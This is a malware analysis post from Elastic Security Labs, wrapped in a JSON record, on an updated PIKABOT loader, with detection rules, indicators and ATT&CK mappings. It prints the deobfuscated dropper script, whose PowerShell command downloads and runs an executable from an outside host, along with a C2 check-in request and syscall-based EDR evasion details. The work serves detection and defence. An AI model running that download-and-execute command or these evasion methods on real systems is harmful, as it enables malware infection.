{
  "attributes": {
    "raw": {
      "document": "---\ntitle: \"PIKABOT, I choose you!\"\nslug: \"pikabot-i-choose-you\"\ndate: \"2024-02-24\"\ndescription: \"Elastic Security Labs observed new PIKABOT campaigns, including an updated version. PIKABOT is a widely deployed loader malicious actors utilize to distribute additional payloads.\"\nauthor:\n  - slug: daniel-stepanic\n  - slug: salim-bitam\nimage: \"photo-edited-02.png\"\ncategory:\n  - slug: campaigns\ntags:\n  - pikabot\n  - loader\n  - syscalls\n---\n\n## PIKABOT at a glance\n\nPIKABOT is a widely deployed loader malicious actors utilize to distribute payloads such as Cobalt Strike or launch ransomware. On February 8th, the Elastic Security Labs team observed new PIKABOT campaigns, including an updated variant. This version of the PIKABOT loader uses a new unpacking method and heavy obfuscation. The core module has added a new string decryption implementation, changes to obfuscation functionality, and various other modifications.\n\n\nThis post will highlight the initial campaign, break down the new loader functionality,  and review the core components. There are interesting design choices in this new update that we think are the start of a new codebase that will make further improvements over time. While the functionality is similar to previous builds, these new updates have likely broken signatures and previous tooling.  \n\nDuring the development of this research, the ThreatLabz team at Zscaler released great [analysis](https://www.zscaler.com/blogs/security-research/d-evolution-pikabot) and insights into a sample overlapping with those in this post. We suggest reading their work along with ours to understand these PIKABOT changes comprehensively.\n\n### Key takeaways\n\n - Fresh campaigns involving significant updates to the PIKABOT loader and core components  \n - PIKABOT loader uses a new unpacking technique of combining scattered chunks of encrypted data in base64 format from `.data` section\n - Changes in the core include toned-down obfuscation and in-line RC4 functions, plaintext configuration at runtime, removal of AES during network communications\n - PIKABOT development appears as a work-in-progress, with future updates likely imminent\n - Call-stack visibility using Elastic Security provides the ability to triage threats like PIKABOT rapidly\n\n#### PIKABOT campaign overview\n\n![PIKABOT execution flow](/assets/images/pikabot-i-choose-you/image17.png)\n\n\nAs the new year started, PIKABOT distribution remained inactive until approximately two weeks ago. This new campaign on February 8th involved emails with hyperlinks that led to ZIP archive files containing a malicious obfuscated Javascript script. \n\n![Obfuscated Javascript within ZIP archive](/assets/images/pikabot-i-choose-you/image21.png)\n\n\nBelow are the contents of the obfuscated JavaScript file, showing the next sequence to download and execute PIKABOT’s loader using PowerShell.\n\n```JavaScript\n// deobfuscated\nvar sites = ['https://gloverstech[.]com/tJWz9/', '', '']\nfor (var i = 0x0; i < 3; i++)\n{\n\tvar obj = new ActiveXObject(\"WScript.Shell\")\n\tobj['Run'](\"powershell Invoke-WebRequest https://gloverstech[.]com/tJWz9/0.2343379541861872.dat -OutFile %SYSTEMDRIVE%\\\\Users\\\\Public\\\\Jrdhtjydhjf.exe; saps %SYSTEMDRIVE%\\\\Users\\\\Public\\\\Jrdhtjydhjf.exe\")\n}\n```\n\n## PIKABOT loader\n\n### Loader stage 1\n\nTo appear authentic, the developer tampered with a legitimate search and replace tool called ```grepWinNP3.exe``` from [this](https://github.com/rizonesoft/Notepad3) repository. Using our internal sandboxing project ([Detonate](https://www.elastic.co/security-labs/click-click-boom-automating-protections-testing-with-detonate)) and leveraging Elastic Defend’s [call stack feature](https://www.elastic.co/security-labs/peeling-back-the-curtain-with-call-stacks) provided a detailed trace of the execution, allowing us to pinpoint the entry point of malicious code. \n\nAn analysis of the call stack data reveals that execution begins at a call before offset ```0x81aa7``` within the malicious file; the execution then leaps to a memory allocation at a call prior to offset ```0x25d84```. Furthermore, it was observed that the process creation call stack is missing normal calls to ```KernelBase.dll!CreateProcessInternalW``` and ```ntdll.dll!NtCreateUserProcess```, due to the use of a syscall via shellcode execution residing in the [unbacked memory](https://www.elastic.co/security-labs/hunting-memory). By using this implementation, it will bypass user-mode hooks on WOW64 modules to evade EDR products. \n\n![Alert call stack for PIKABOT loader](/assets/images/pikabot-i-choose-you/image8.png)\n\n\nLooking into the offset ```0x81aa7``` of the malicious file and conducting a side-by-side code comparison with a verified, benign version of the ```grepWinNP3.exe``` file, we identified something distinct and unusual: a hardcoded address to execute the PIKABOT loader, this marks the entrypoint of the PIKABOT loader.\n\n![Entrypoint to malicious code](/assets/images/pikabot-i-choose-you/image1.png)\n\n\nThe malicious code employs heavy obfuscation, utilizing a technique where a jump (```JMP```) follows each assembly instruction. This approach significantly complicates analysis by disrupting the straightforward flow of execution.\n\n![Obfuscation involving a combination of instructions and jumps](/assets/images/pikabot-i-choose-you/image14.png)\n\n \nThe loader extracts its stage 2 payload from the ```.text``` section, where it is stored in chunks of ```0x94``` bytes, before consolidating the pieces. It then employs a seemingly custom decryption algorithm, which utilizes bitwise operations. \n\n![Decryption algorithm for stage 2 payload](/assets/images/pikabot-i-choose-you/image5.png)\n\n\nThe next step of the process is to reflectively load the PE file within the confines of the currently executing process. This technique involves dynamically loading the PE file's contents into memory and executing it, without the need for the file to be physically written to disk. This method not only streamlines the execution process by eliminating the necessity for external file interactions but also significantly enhances stealth by minimizing the digital footprint left on the host system.\n\n![Reflectively loading PE](/assets/images/pikabot-i-choose-you/image25.png)\n\n\n### Loader stage 2\n\nThe stage 2 loader, tasked with initializing the PIKABOT core within a newly established process, employs a blend of code and string obfuscation techniques similar to those found in the core itself. In addition to its obfuscation capabilities, the loader incorporates a series of advanced anti-debugging countermeasures.\n\n#### Anti-debugging\n\nThe malware utilizes specific NTDLL ```Zw``` APIs for a variety of operations, including debugger detection, process creation, and injection, aiming to stay under the radar of detection mechanisms and evade EDR (Endpoint Detection and Response) user-land hooking, as well as debugging attempts. \n\nIt executes syscalls directly, bypassing conventional API calls that are more susceptible to monitoring and interception. It uses a wrapper function that facilitates the execution of syscalls in 64-bit mode which takes a hash of a ```Zw``` API name as a parameter.\n\n![Function used to execute syscall by hash](/assets/images/pikabot-i-choose-you/image24.png)\n\n\nThe wrapper function extracts the syscall ID by parsing the loaded NTDLL and matching the hash of the ```Zw``` function name. After finding the correct syscall ID, it uses the ```Wow64Transition``` Windows API to execute the syscall in 64-bit mode.\n\n![Control flow graph showing syscall passed to ```WoW64Transition```](/assets/images/pikabot-i-choose-you/image11.png)\n\n\nNote that the parameters needed are pushed on the stack before the wrapper is called, the following example showcases a ```ZwQueryInformationProcess``` call with the ```ProcessInformationClass``` set to ```ProcessDebugPort```(7):\n\n![Syscall parameters pushed on stack](/assets/images/pikabot-i-choose-you/image6.png)\n\n\nThe malware employs a series of anti-debugging techniques designed to thwart detection by debugging and forensic tools. These techniques include:\n - Calling ```ZwQuerySystemInformation``` with the ```SystemKernelDebuggerInformation``` parameter to detect the presence of kernel debuggers.\n - Calling ```ZwQueryInformationProcess``` with the ```ProcessInformationClass``` set to ```ProcessDebugPort``` to identify any debugging ports associated with the process.\n - Calling ```ZwQueryInformationProcess``` again, but with the ```ProcessInformationClass``` set to ```ProcessDebugFlags``` parameter, to ascertain if the process has been flagged for debugging.\n - Inspecting the Process Environment Block (PEB) for the ```BeingDebugged``` flag, which indicates if the process is currently being debugged.\n - Using ```GetThreadContext``` to detect hardware breakpoints.\nScanning the list of currently running processes to identify any active debugging or forensic tools.\n\n![Decompilation of debugging checks](/assets/images/pikabot-i-choose-you/image9.png)\n\n\nInterestingly, we discovered a bug where some of the process names it checks have their first byte zeroed out, this could suggest a mistake by the malware’s author or an unwanted side-effect added by the obfuscation tool. The full list of process names that are checked can be found at the end of this article.\n\n![Process names with missing first byte](/assets/images/pikabot-i-choose-you/image15.png)\n\n\n#### Execution\n\nThe loader populates a global variable with the addresses of essential APIs from the NTDLL and KERNEL32 libraries. This step is pivotal for the malware's operation, as these addresses are required for executing subsequent tasks. Note that the loader employs a distinct API name hashing algorithm, diverging from the one previously used for `Zw` APIs.\n\n![APIs retrieved for loading core component](/assets/images/pikabot-i-choose-you/image19.png)\n\n\nBelow is the reconstructed structure:\n\n```C\nstruct global_variable\n{\n  int debugger_detected;\n  void* LdrLoadDll;\n  void* LdrGetProcedureAddress;\n  void* RtlAllocateHeap;\n  void* RtlFreeHeap;\n  void* RtlDecompressBuffer;\n  void* RtlCreateProcessParametersEx;\n  void* RtlDestroyProcessParameters;\n  void* ExitProcess;\n  void* CheckRemoteDebuggerPresent;\n  void* VirtualAlloc;\n  void* GetThreadContext;\n  void* VirtualFree;\n  void* CreateToolhelp32Snapshot;\n  void* Process32FirstW;\n  void* Process32NextW;\n  void* ntdll_module;\n  void* kernel32_dll;\n  int field_48;\n  uint8_t* ptr_decrypted_PIKABOT_core;\n  int decrypted_PIKABOT_core_size;\n  TEB* TEB;\n};\n```\nLoader structure \n\nThe malware then consolidates bytes of the PIKABOT core that are scattered in the `.data` section in base64-encoded chunks, which is noteworthy when compared to a previous version which loaded a set of PNGs from its resources section.\n\n![Functions used to retrieve core payload in chunks](/assets/images/pikabot-i-choose-you/image2.png)\n\n\nIt executes a sequence of nine distinct functions, each performing similar operations but with varying arguments. Each function decrypts an RC4 key using an in-line process that utilizes strings that appear legitimate. The function then base64 decodes each chunk before decrypting the bytes.\n\n![Decryption functions using RC4 and base64](/assets/images/pikabot-i-choose-you/image3.png)\n\n\nAfter consolidating the decrypted bytes, it uses the ```RtlDecompressBuffer``` API to decompress them.\n\n\n![PIKABOT loader using decompression function](/assets/images/pikabot-i-choose-you/image27.png)\n\n\nThe loader creates a suspended instance of ```ctfmon.exe``` using the ```ZwCreateUserProcess``` syscall, a tactic designed to masquerade as a legitimate Windows process. Next, it allocates a large memory region remotely via the ```ZwAllocateVirtualMemory``` syscall to house the PIKABOT core's PE file.\n\nSubsequently, the loader writes the PIKABOT core into the newly allocated memory area using the ```ZwWriteVirtualMemory``` syscall. It then redirects the execution flow from ```ctfmon.exe``` to the malicious PIKABOT core by calling the ```SetContextThread``` API to change the thread's execution address. Finally, it resumes the thread with ```ZwResumeThread``` syscall.\n\n![Syscall execution of core payload](/assets/images/pikabot-i-choose-you/image13.png)\n\n\n## PIKABOT core\n\nThe overall behavior and functionality of the updated PIKABOT core are similar to previous versions: the bot collects initial data from the victim machine and presents the threat actor with command and control access to enable post-compromise behavior such as command-line execution, discovery, or launching additional payloads through injection. \n\nThe notable differences include:\n - New style of obfuscation with fewer in-line functions\n - Multiple implementations for decrypting strings\n - Plaintext configuration at runtime, removal of JSON format \n - Network communication uses RC4 plus byte swapping, removal of AES\n\n### Obfuscation \n\nOne of the most apparent differences is centered around the obfuscation of PIKABOT. This version contains a drastically less obfuscated binary but provides a familiar feel to older versions. Instead of a barrage of in-line RC4 functions, there are only a few left after the new update. Unfortunately, there is still a great deal of obfuscation applied to global variables and junk instructions.  \n\nBelow is a typical example of junk code being inserted in between the actual malware’s code, solely to extend analysis time and add confusion. \n\n![Obfuscation using global variables](/assets/images/pikabot-i-choose-you/image18.png)\n\n\n### String Decryption\n\nAs mentioned previously, there are still some in-line RC4 functions used to decrypt strings. In previous versions, the core used base64 encoding as an additional step in combination with using AES and RC4 to obscure the strings; in this core version, we haven’t seen base64 encoding or AES used for string decryption.\n\nHere’s an instance of a remaining in-line RC4 function used to decrypt the hardcoded mutex. In this version, PIKABOT continues its trademark use of legitimate strings as the RC4 key to decrypt data.\n\n![In-line RC4](/assets/images/pikabot-i-choose-you/image12.png)\n\n\n![String decryption using RC4 with benign strings](/assets/images/pikabot-i-choose-you/image16.png)\n\n\nIn this new version, PIKABOT includes a different implementation for string obfuscation by using stack strings and placing individual characters into an array in a randomized order. Below is an example using ```netapi32.dll```:\n\n\n![Stack string placement using ```netapi32.dll```](/assets/images/pikabot-i-choose-you/image22.png)\n\n\n### Anti-debugging\n\nIn terms of anti-debugging in this version, PIKABOT checks the ```BeingDebuggedFlag``` in the PEB along with using ```CheckRemoteDebuggerPresent```. In our sample, a hardcoded value (```0x2500```) is returned if a debugger is attached. These checks unfortunately are not in a single place, but scattered in different places throughout the binary, for example right before network requests are made.\n\n![Debugger check](/assets/images/pikabot-i-choose-you/image9.png)\n\n\n### Execution\n\nRegarding execution and overall behaviors, PIKABOT’s core closely follows the execution flow of older versions. Upon execution, PIKABOT parses the PEB and uses API hashing to resolve needed libraries at runtime. Next, it validates the victim machine by verifying the language identifier using ```GetUserDefaultLangID```. If the `LangID` is set to Russian (```0x419```) or Ukranian (```0x422```), the malware will immediately stop its execution.\n\n![Language check](/assets/images/pikabot-i-choose-you/image26.png)\n\n \nAfter the language check, PIKABOT creates a mutex to prevent reinfection on the same machine. Our sample used the following mutex: ```{6F70D3AF-34EF-433C-A803-E83654F6FD7C}```\n\nNext, the malware will generate a UUID from the victim machine using the system volume number in combination with the hostname and username. PIKABOT will then generate a unique RC4 key seeded by ```RtlRandomEx``` and then place the key into the config structure to be used later during its network communications.\n\n### Initial Collection\n\nThe next phase involves collecting victim machine information and placing the data into a custom structure that will then be encrypted and sent out after the initial check-in request. The following actions are used to fingerprint and identify the victim and their network:\n - Retrieves the name of the user associated with the PIKABOT thread\n - Retrieves the computer name \n - Gets processor information\n - Grabs display device information using ```EnumDisplayDevicesW```\n - Retrieves domain controller information using ```DsGetDcNameW```\n - Collects current usage around physical and virtual memory using ```GlobalMemoryStatusEx```\n - Gets the window dimensions using ```GetWindowRect``` used to identify sandbox environments\n - Retrieves Windows OS product information using ```RtlGetVersion```\n - Uses ```CreateToolhelp32Snapshot``` to retrieve process information\n\n![Victim information retrieved such as username, computer name, etc](/assets/images/pikabot-i-choose-you/image23.png)\n\n\n### Config\n\nOne strange development decision in this new version is around the malware configuration. At runtime, the configuration is in plaintext and located in one spot in memory. This does eventually get erased in memory. We believe this will only temporarily last as previous versions protected the configuration and it has become a standard expectation when dealing with prevalent malware families. \n\n![Configuration in plaintext at core runtime](/assets/images/pikabot-i-choose-you/image4.png)\n\n\n### Network\n\nPIKABOT performs network communication over HTTPS on non-traditional ports (2967, 2223, etc) using User-Agent ```Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7166; Pro)```. The build number of the PIKABOT core module is concatenated together from the config and can be found being passed within the encrypted network requests, the version we analyzed is labeled as ```1.8.32-beta```.\n\n![New PIKABOT version on the stack](/assets/images/pikabot-i-choose-you/image10.png)\n\n\nOn this initial check-in request to the C2 server, PIKABOT registers the bot while sending the previously collected information encrypted with RC4. The RC4 key is sent in this initial packet at offset (```0x10```). As mentioned previously, PIKABOT no longer uses AES in its network communications. \n\n```\nPOST https://158.220.80.167:2967/api/admin.teams.settings.setIcon HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.8\nUser-Agent: Microsoft Office/14.0 (Windows NT 6.1; Microsoft Outlook 14.0.7166; Pro)\nContent-Length: 6778\nHost: 158.220.80.167:2967\n\n00001a7600001291000016870000000cbed67c4482a40ad2fc20924a06f614a40256fca898d6d2e88eecc638048874a8524d73037ab3b003be6453b7d3971ef2d449e3edf6c04a9b8a97e149a614ebd34843448608687698bae262d662b73bb316692e52e5840c51a0bad86e33c6f8926eb850c2...\n```\n_PIKABOT initial check-in request_\n\nFor each outbound network request, PIKABOT randomly chooses one of the following URI’s:\n\n```\n/api/admin.conversations.convertToPrivate\n/api/admin.conversations.getConversationPrefs\n/api/admin.conversations.restrictAccess.removeGroup\n/api/admin.emoji.add\n/api/admin.emoji.addAlias\n/api/admin.emoji.list\n/api/admin.inviteRequests.approved.list\n/api/admin.teams.admins.list\n/api/admin.teams.settings.setIcon\n/api/admin.usergroups.addTeams\n/api/admin.users.session.reset\n/api/apps.permissions.users.list\n```\n_List of URI’s used in PIKABOT C2 requests_\n\nUnlike previous versions by which victim data was placed in a structured format using JSON, the data within these requests are raw bytes. The first 16 bytes are used to pass specific config information (bot command ID, byte shift, etc). The next 32-bytes embed the RC4 key for the session where then the encrypted data is followed in the request. \n\nThere is one additional transformation where the developers added a random shift of bytes that occurs at runtime. This number (`0x18`) at offset (`0xF`) in the example request below represents the number of bytes to shift from the end of the encrypted data to the start of the encrypted data. In our example, to successfully decrypt the data, the last 18 bytes would need to be placed in front of bytes (`0xDA 0x9E`). \n\n![Hex view of network request on initial check-in](/assets/images/pikabot-i-choose-you/image20.png)\n\n\n### Bot Functionality\n\nIn terms of the core bot functionality, it is similar to previous versions:  executing commands, performing discovery, as well as process injection capabilities. From our perspective, it still seems very much like a work in progress. One command ID (`0x982`) is an empty function, in another case, there are three unique command ID’s pointed to the same function. These indicate that this software is not quite complete.\n\n\n| Command ID | Description |\n|------------|-------------|\n| 0x1FED | Beacon timeout |\n| 0x1A5A | Exits the PIKABOT process |\n| 0x2672 | Includes obfuscation, but appears to not do anything meaningful |\n| 0x246F | Creates file on disk and modifies registry tied to configuration |\n| 0xACB | Command-line execution with output |\n| 0x36C | PE inject in a remote process |\n| 0x792 | Shellcode inject in a remote process |\n| 0x359, 0x3A6, 0x240 | Command-line execution similar to 0xACB, uses custom error code (0x1B3) |\n| 0x985 | Process enumeration, similar to initial victim collection enumeration |\n| 0x982 | Empty function |\n\n### Malware and MITRE ATT&CK\n\nElastic uses the [MITRE ATT&CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.\n\n#### Tactics\nTactics represent the _why_ of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.\n\n - [Initial Access](https://attack.mitre.org/tactics/TA0001)\n - [Execution](https://attack.mitre.org/tactics/TA0002/)\n - [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)\n - [Discovery](https://attack.mitre.org/tactics/TA0007)\n - [Command and Control](https://attack.mitre.org/tactics/TA0011)\n - [Exfiltration](https://attack.mitre.org/tactics/TA0010/)\n \n#### Techniques\nTechniques represent how an adversary achieves a tactical goal by performing an action.\n\n - [Phishing](https://attack.mitre.org/techniques/T1566/)\n - [User Execution: Malicious Link](https://attack.mitre.org/techniques/T1204/001/)\n - [Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)\n - [System Information Discovery](https://attack.mitre.org/techniques/T1082/)\n - [Process Injection](https://attack.mitre.org/techniques/T1055/)\n - [Encrypted Channel](https://attack.mitre.org/techniques/T1573/)\n\n## Detecting malware\n\n### Prevention\n\n - [Network Module Loaded from Suspicious Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml)\n - [Shellcode Execution from Low Reputation Module](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml)\n - [Suspicious Memory Write to a Remote Process](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_suspicious_memory_write_to_a_remote_process.toml)\n - [Suspicious Remote Memory Allocation](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_suspicious_remote_memory_allocation.toml)\n - [Process Creation with Unusual Mitigation](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_process_creation_with_unusual_mitigation.toml)\n - [Windows.Trojan.PikaBot](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PikaBot.yar)\n\n#### YARA\n\nElastic Security has created YARA rules to identify this activity. Below are YARA rules to identify [PIKABOT](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PikaBot.yar):\n\n```\nrule Windows_Trojan_Pikabot_5441f511 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-02-15\"\n        last_modified = \"2024-02-15\"\n        license = \"Elastic License v2\"\n        description = \"Related to PIKABOT core\"\n        os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.PIKABOT\"\n\n    strings:\n        $handler_table = { 72 26 [6] 6F 24 [6] CB 0A [6] 6C 03 [6] 92 07 }\n        $api_hashing = { 3C 60 76 ?? 83 E8 20 8B 0D ?? ?? ?? ?? 6B FF 21 }\n        $debug_check = { A1 ?? ?? ?? ?? FF 50 ?? 50 50 80 7E ?? 01 74 ?? 83 7D ?? 00 75 ?? }\n        $checksum = { 55 89 E5 8B 55 08 69 02 E1 10 00 00 05 38 15 00 00 89 02 5D C3 }\n        $load_sycall = { 8F 05 ?? ?? ?? ?? 83 C0 04 50 8F 05 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 A3 ?? ?? ?? ?? 31 C0 64 8B 0D C0 00 00 00 85 C9 }\n        $read_xbyte_config = { 8B 43 04 8B 55 F4 B9 FC FF FF FF 83 C0 04 29 D1 01 4B 0C 8D 0C 10 89 4B 04 85 F6 ?? ?? 89 16 89 C3 }\n    condition:\n        2 of them\n}\n\nrule Windows_Trojan_Pikabot_95db8b5a {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-02-15\"\n        last_modified = \"2024-02-15\"\n        license = \"Elastic License v2\"\n        description = \"Related to PIKABOT loader\"\n        os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.PIKABOT\"\n\n    strings:\n        $syscall_ZwQueryInfoProcess = { 68 9B 8B 16 88 E8 73 FF FF FF }\n        $syscall_ZwCreateUserProcess = { 68 B2 CE 2E CF E8 5F FF FF FF }\n        $load_sycall = { 8F 05 ?? ?? ?? ?? 83 C0 04 50 8F 05 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 A3 ?? ?? ?? ?? 31 C0 64 8B 0D C0 00 00 00 85 C9 }\n        $payload_chunking = { 8A 84 35 ?? ?? ?? ?? 8A 95 ?? ?? ?? ?? 88 84 1D ?? ?? ?? ?? 88 94 35 ?? ?? ?? ?? 02 94 1D ?? ?? ?? ?? }\n        $loader_rc4_decrypt_chunk = { F7 FF 8A 84 15 ?? ?? ?? ?? 89 D1 8A 94 1D ?? ?? ?? ?? 88 94 0D ?? ?? ?? ?? 8B 55 08 88 84 1D ?? ?? ?? ?? 02 84 0D ?? ?? ?? ?? 0F B6 C0 8A 84 05 ?? ?? ?? ?? 32 04 32 }\n    condition:\n        2 of them\n}\n```\n\n## Observations\n\nAll observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/pikabot) in both ECS and STIX format.\n\nThe following observables were discussed in this research.\n\n| Observable |    Type     | Name        | Reference   |\n|------------|-------------|-------------|-------------|\n| `2f66fb872c9699e04e54e5eaef982784b393a5ea260129a1e2484dd273a5a88b` | SHA-256 | `Opc.zip` | Zip archive holding obfuscated Javascript |\n| `ca5fb5814ec62c8f04936740aabe2664b3c7d036203afbd8425cd67cf1f4b79d`| SHA-256 | `grepWinNP3.exe` | PIKABOT loader |\n| `139.84.237[.]229:2967` | ipv4-addr | | PIKABOT C2 server |\n| `85.239.243[.]155:5000` | ipv4-addr | | PIKABOT C2 server |\n| `104.129.55[.]104:2223` | ipv4-addr | | PIKABOT C2 server |\n| `37.60.242[.]85:9785` | ipv4-addr | | PIKABOT C2 server |\n| `95.179.191[.]137:5938` | ipv4-addr | | PIKABOT C2 server |\n| `65.20.66[.]218:5938` | ipv4-addr | PIKABOT C2 server |\n| `158.220.80[.]157:9785` | ipv4-addr | PIKABOT C2 server |\n| `104.129.55[.]103:2224` | ipv4-addr | PIKABOT C2 server |\n| `158.220.80[.]167:2967` | ipv4-addr | PIKABOT C2 server |\n| `entrevientos.com[.]ar` | domain | | Hosting infra for zip archive |\n| `gloverstech[.]com` | domain | | Hosting infra for PIKABOT loader |\n\n## References\n\nThe following were referenced throughout the above research:\n - [https://www.zscaler.com/blogs/security-research/d-evolution-PIKABOT](https://www.zscaler.com/blogs/security-research/d-evolution-pikabot)\n - [https://x.com/Cryptolaemus1/status/1755655639370514595?s=20](https://x.com/Cryptolaemus1/status/1755655639370514595?s=20)\n\n## Appendix\n\n```\nProcess Name Checks\ntcpview.exe\nfilemon.exe\nautoruns.exe\nautorunsc.exe\nProcessHacker.exe\nprocmon.exe\nprocexp.exe\nidaq.exe\nregmon.exe\nidaq64.exe\n\n\nx32dbg.exe\nx64dbg.exe\nFiddler.exe\nhttpdebugger.exe\ncheatengine-i386.exe\ncheatengine-x86_64.exe\ncheatengine-x86_64-SSE4-AVX2.exe\n\n\nPETools.exe\nLordPE.exe\nSysInspector.exe\nproc_analyzer.exe\nsysAnalyzer.exe\nsniff_hit.exe\nwindbg.exe\njoeboxcontrol.exe\njoeboxserver.exe\nResourceHacker.exe\n\n\nImmunityDebugger.exe\nWireshark.exe\ndumpcap.exe\nHookExplorer.exe\nImportREC.exe\n```"
    },
    "title": "PIKABOT, I choose you!",
    "slug": "pikabot-i-choose-you",
    "date": "2024-02-24",
    "description": "Elastic Security Labs observed new PIKABOT campaigns, including an updated version. PIKABOT is a widely deployed loader malicious actors utilize to distribute additional payloads.",
    "author": [
      {
        "slug": "daniel-stepanic"
      },
      {
        "slug": "salim-bitam"
      }
    ],
    "image": "photo-edited-02.png",
    "category": [
      {
        "slug": "campaigns"
      }
    ],
    "tags": [
      "pikabot",
      "loader",
      "syscalls"
    ]
  },
  "id": "security_labs_content-pikabot_i_choose_you-md",
  "type": "security_labs_content"
}
